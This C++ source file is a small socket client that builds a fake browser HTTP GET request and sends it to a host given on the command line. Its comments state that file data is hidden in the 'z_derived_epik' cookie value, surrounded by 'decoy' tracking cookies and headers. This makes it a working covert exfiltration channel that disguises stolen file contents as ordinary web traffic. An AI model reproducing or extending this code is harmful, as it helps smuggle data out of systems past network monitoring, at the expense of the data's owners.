#include <stdio.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <string.h>
#include <arpa/inet.h>
#include <string>

using namespace std;

//All File data will be stored in this cookie
//cookie: dsl25_frhf=control; ccpa=true; dsl25_frhf_tracked=1; bf_visit=u%3D.ysp8Kdb1gg%26uuid%3D32b7bead-28bc-44e7-9c36-68f60481bf2f%26v%3D2; tracking_facebook=on; tracking_facebook_version=1; ads_scroll_subscription=on; ads_scroll_subscription_version=1; ads_prebid=on; ads_prebid_version=1; ads_amazon_tam=on; ads_amazon_tam_version=1; ads_ad_lightning=on; ads_ad_lightning_version=1; ads_adrizer=on; ads_adrizer_version=1; ads_moat=on; ads_moat_version=1; ads_blockthrough=on; ads_blockthrough_version=1; moat_dfp_native_video_tracking=on; moat_dfp_native_video_tracking_version=1; advertise_international=on; advertise_international_version=1; non_us_ad_lookahead_adjustments=on; non_us_ad_lookahead_adjustments_version=1; ADSGROUP-442-permutive=on; ADSGROUP-442-permutive_version=1; ADS-1351_promo-inline-display-cards=control; ADS-1351_promo-inline-display-cards_version=2; qualtrics_intercepts=on; qualtrics_intercepts_version=1; OOA11Y-159-shopping-newsletter=variant1; OOA11Y-159-shopping-newsletter_version=1; ADRIZER_SOURCE={%22value%22:%22%22%2C%22expires%22:%222020-03-03T20:47:06.533Z%22}; ADRIZER_WIDGET={%22value%22:%22%22%2C%22expires%22:%222020-03-03T20:47:06.533Z%22}; bf-xdomain-session-uuid=df9a3f5b-91ce-4e99-bd5d-749fe4fa4463; _cmpQcif3pcsupported=1; _ga=GA1.2.1619320656.1583095627; _gid=GA1.2.1139481407.1583095627; _gat=1; permutive-session=%7B%22session_id%22%3A%2241092298-2f23-472d-b18c-9f180aaacc70%22%2C%22last_updated%22%3A%222020-03-01T20%3A47%3A07.508Z%22%7D; sailthru_pageviews=1; __qca=P0-2089884155-1583095627339; z_derived_epik=dj0yJnU9dHhtUXVYOFBXNGdvUkhDZzU5NDR5LUltM2FCbXBWSzYmbj1rdUJ1TDdwdC1hOTl0OWZMU01rMmhBJm09NyZ0PUFBQUFBRjVjSDB3; sailthru_content=b697b2aa95a614f8ec47e331bf4afa20; sailthru_visitor=f1d00e6c-2787-4e6d-923e-73f578bc1a1f\r\n

//will use z_derived_epik cookie

//Decoy Cookies
//accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n
//accept-encoding: gzip, deflate, br\r\n
//accept-language: en-US,en;q=0.9\r\n
//cache-control: max-age=0\r\n
//COOKIE GOES HERE
//upgrade-insecure-requests: 1\r\n
//user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36\r\n

int main(int argc, char const *argv[])
{
  int sock = 0; long valread;
  struct sockaddr_in serv_addr;

  char buffer[11885] = {0};
  if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
  {
      printf("\n Socket creation error \n");
      return -1;
  }

  memset(&serv_addr, '0', sizeof(serv_addr));

  serv_addr.sin_family = AF_INET;
  serv_addr.sin_port = htons((atoi(argv[2])));

  // Convert IPv4 and IPv6 addresses from text to binary form
  if(inet_pton(AF_INET, argv[1], &serv_addr.sin_addr)<=0)
  {
      printf("ADDRESS NOT SUPPORTED \n");
      return -1;
  }

  if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
  {
      printf("CONNECTION FAILED \n");
      return -1;
  }
	//for (int i = 0; i < chunks; i++)
	//{
  char send_data[4096];
  strcpy(send_data,"GET /");
	strcat(send_data,"test.txt");
	strcat(send_data," HTTP/1.1\r\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\naccept-encoding: gzip, deflate, br\r\naccept-language: en-US,en;q=0.9\r\ncache-control: max-age=0\r\ncookie: dsl25_frhf=control; ccpa=true; dsl25_frhf_tracked=1; bf_visit=u%3D.ysp8Kdb1gg%26uuid%3D32b7bead-28bc-44e7-9c36-68f60481bf2f%26v%3D2; tracking_facebook=on; tracking_facebook_version=1; ads_scroll_subscription=on; ads_scroll_subscription_version=1; ads_prebid=on; ads_prebid_version=1; ads_amazon_tam=on; ads_amazon_tam_version=1; ads_ad_lightning=on; ads_ad_lightning_version=1; ads_adrizer=on; ads_adrizer_version=1; ads_moat=on; ads_moat_version=1; ads_blockthrough=on; ads_blockthrough_version=1; moat_dfp_native_video_tracking=on; moat_dfp_native_video_tracking_version=1; advertise_international=on; advertise_international_version=1; non_us_ad_lookahead_adjustments=on; non_us_ad_lookahead_adjustments_version=1; ADSGROUP-442-permutive=on; ADSGROUP-442-permutive_version=1; ADS-1351_promo-inline-display-cards=control; ADS-1351_promo-inline-display-cards_version=2; qualtrics_intercepts=on; qualtrics_intercepts_version=1; OOA11Y-159-shopping-newsletter=variant1; OOA11Y-159-shopping-newsletter_version=1; ADRIZER_SOURCE={%22value%22:%22%22%2C%22expires%22:%222020-03-03T20:47:06.533Z%22}; ADRIZER_WIDGET={%22value%22:%22%22%2C%22expires%22:%222020-03-03T20:47:06.533Z%22}; bf-xdomain-session-uuid=df9a3f5b-91ce-4e99-bd5d-749fe4fa4463; _cmpQcif3pcsupported=1; _ga=GA1.2.1619320656.1583095627; _gid=GA1.2.1139481407.1583095627; _gat=1; permutive-session=%7B%22session_id%22%3A%2241092298-2f23-472d-b18c-9f180aaacc70%22%2C%22last_updated%22%3A%222020-03-01T20%3A47%3A07.508Z%22%7D; sailthru_pageviews=1; __qca=P0-2089884155-1583095627339; z_derived_epik=\"");
  //Contents of file
	strcat(send_data,"testFileContent");
	strcat(send_data,"\r\nupgrade-insecure-requests: 1\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36\r\n");
	send(sock , send_data , strlen(send_data) , 0 );
	valread = read( sock , buffer, 11885);
	printf("%s\n",buffer );
  printf("IM DONE");
	return 0;
	//}

}
